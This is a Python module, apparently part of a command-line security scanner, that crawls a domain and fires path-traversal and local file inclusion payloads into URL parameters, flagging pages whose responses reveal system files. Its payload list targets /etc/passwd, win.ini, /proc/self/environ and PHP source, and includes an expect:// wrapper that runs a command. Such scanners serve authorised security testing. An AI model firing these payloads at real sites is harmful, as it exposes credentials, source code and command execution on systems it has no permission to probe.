"""
lfi - Local File Inclusion / Path Traversal scanner.

Probes URLs with common LFI payloads and checks for successful file reads
(/etc/passwd, windows/win.ini, etc).

Usage:
  python matthunder_cli.py lfi example.com
"""

import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx

from . import SCANNER_REGISTRY
from .common import (
    DEFAULT_TIMEOUT, USER_AGENT, canonical_url, crawl_domain,
    finish_scan, host_in_scope, log, normalize_domain,
    open_db, utc_now_iso,
)


LFI_PAYLOADS = [
    ("../../../etc/passwd", "root:"),
    ("....//....//....//etc/passwd", "root:"),
    ("/etc/passwd%00", "root:"),
    ("..%2f..%2f..%2fetc%2fpasswd", "root:"),
    ("..\\..\\..\\windows\\win.ini", "[fonts]"),
    ("..%5c..%5c..%5cwindows%5cwin.ini", "[fonts]"),
    ("/proc/self/environ", "USER="),
    ("php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd"),
    ("php://filter/convert.base64-encode/resource=index.php", "PD9w"),
    ("expect://id", "uid="),
]


def _probe_url(url: str, param: str, client: httpx.Client) -> dict:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if param not in qs:
        return {"vulnerable": False}

    for payload, marker in LFI_PAYLOADS:
        test_qs = dict(qs)
        test_qs[param] = [payload]
        new_query = urlencode(test_qs, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))

        try:
            r = client.get(test_url, timeout=DEFAULT_TIMEOUT, follow_redirects=True)
            if r.status_code == 200 and marker.lower() in r.text.lower():
                return {
                    "vulnerable": True,
                    "url": url,
                    "param": param,
                    "payload": payload,
                    "evidence": marker,
                    "status": r.status_code,
                }
        except Exception:
            continue

    return {"vulnerable": False}


def run(domain: str, max_pages: int = 30) -> dict:
    domain = normalize_domain(domain)

    con = open_db()
    scan_id = con.execute(
        "INSERT INTO scans (id, scanner, domain, params, status, created_at) "
        "VALUES (lower(hex(randomblob(16))), 'lfi', ?, ?, 'running', ?)",
        (domain, "path-traversal", utc_now_iso()),
    ).lastrowid
    con.commit()
    scan_id = con.execute("SELECT id FROM scans WHERE rowid=?", (scan_id,)).fetchone()["id"]
    log(con, scan_id, f"LFI scan started - domain: {domain}")

    pages = crawl_domain(domain, max_pages=max_pages)
    log(con, scan_id, f"Crawled {len(pages)} pages")

    findings: list[dict] = []

    with httpx.Client(headers={"User-Agent": USER_AGENT}, follow_redirects=True, timeout=DEFAULT_TIMEOUT) as client:
        for page_url, html in pages:
            parsed = urlparse(page_url)
            params = list(parse_qs(parsed.query).keys())
            if not params:
                continue
            for param in params:
                result = _probe_url(page_url, param, client)
                if result.get("vulnerable"):
                    findings.append(result)
                    log(con, scan_id, f"LFI found: {page_url} param={param}")

    for f in findings:
        con.execute(
            "INSERT INTO results (scan_id, category, target_url, status, detail, extracted_at) "
            "VALUES (?, ?, ?, ?, ?, ?)",
            (scan_id, "lfi", f["url"], "vulnerable",
             f"param={f['param']} payload={f['payload']} evidence={f['evidence']}", utc_now_iso()),
        )
    con.commit()
    finish_scan(con, scan_id, status="completed", total_sources=len(pages), total_links=len(findings))
    con.close()
    return {"scan_id": scan_id, "scanner": "lfi", "domain": domain, "pages": len(pages), "findings": len(findings)}


SCANNER_REGISTRY["lfi"] = run
